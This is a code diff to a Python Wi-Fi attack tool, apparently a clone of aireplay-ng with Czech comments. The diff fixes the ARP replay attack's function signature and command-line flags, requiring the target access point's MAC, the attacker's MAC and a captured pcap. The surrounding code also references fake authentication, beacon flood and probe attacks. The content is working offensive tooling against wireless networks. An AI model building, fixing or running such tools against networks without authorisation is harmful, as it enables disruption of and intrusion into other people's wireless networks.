@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 import argparse
 import sys
+import os
 import random
 import time
 import threading
@@ -77,8 +78,8 @@ def fake_auth_attack(iface, ap_mac, your_mac, count=10):
     print_good(f"Fake Auth attack finished, total packets sent: {sent}")
     
 # ================== ARP REPLAY ATTACK jako aireplay-ng ==================
-def arp_replay_attack(iface, pcap_file):
-    print_info(f"Starting ARP Replay attack with packet from '{pcap_file}' on interface {iface}")
+def arp_replay_attack(iface, ap_mac, your_mac, pcap_file):
+    print_info(f"Starting ARP Replay attack with packet from '{pcap_file}' on interface {iface}, AP: {ap_mac}, Your MAC: {your_mac}")
     packets = rdpcap(pcap_file)
     # Najdeme první ARP request v pcapu
     arp_packet = None
@@ -87,7 +88,7 @@ def arp_replay_attack(iface, pcap_file):
             arp_packet = pkt
             break
     if arp_packet is None:
-        print_fail("No ARP request packet found in the pcap file!")
+        print_error("No ARP request packet found in the pcap file!")
         return
 
     print_info("Using following ARP request packet for replay:")
@@ -187,11 +188,10 @@ def parse_args():
     parser.add_argument("--fakeauth", action='store_true', help="Perform Fake Authentication attack")
     parser.add_argument("-m", metavar="YOUR_MAC", help="Your MAC address (required for fakeauth and arpreplay)")
 
-    # ARP replay attack parser
-    arpreplay_parser = subparsers.add_parser("arpreplay", help="ARP Replay attack (replay captured ARP request)")
-    arpreplay_parser.add_argument("-r", "--pcap", required=True, help="PCAP file with ARP request packet to replay")
-    arpreplay_parser.add_argument("iface", help="Interface to use")
-
+    # ARP replay attack
+    parser.add_argument("--arpreplay", action='store_true', help="Perform ARP Replay attack")
+    parser.add_argument("-b", metavar="AP_MAC", help="MAC address of target AP (required for arpreplay)")
+    parser.add_argument("-r", "--pcap", help="PCAP file with ARP request packet to replay (required for arpreplay)")
 
     # Beacon flood
     parser.add_argument("--beacon", action='store_true', help="Perform Beacon Flood attack")
@@ -213,8 +213,8 @@ def parse_args():
         if not args.a or not args.m:
             parser.error("Fakeauth requires -a <AP_MAC> and -m <Your MAC>")
     if args.arpreplay:
-        if not args.b or not args.m:
-            parser.error("ARPreplay requires -b <AP_MAC> and -m <Your MAC>")
+        if not args.b or not args.m or not args.pcap:
+            parser.error("ARPreplay requires -b <AP_MAC>, -m <Your MAC>, and -r <PCAP file>")
     if args.beacon:
         if not args.f:
             parser.error("Beacon flood requires -f <SSID file>")
@@ -232,7 +232,7 @@ def main():
     elif args.fakeauth:
         fake_auth_attack(args.interface, args.a.lower(), args.m.lower(), args.n)
     elif args.arpreplay:
-        arp_replay_attack(args.interface, args.b.lower(), args.m.lower())
+        arp_replay_attack(args.interface, args.b.lower(), args.m.lower(), args.pcap)
     elif args.beacon:
         beacon_flood(args.interface, args.f)
     elif args.probe:
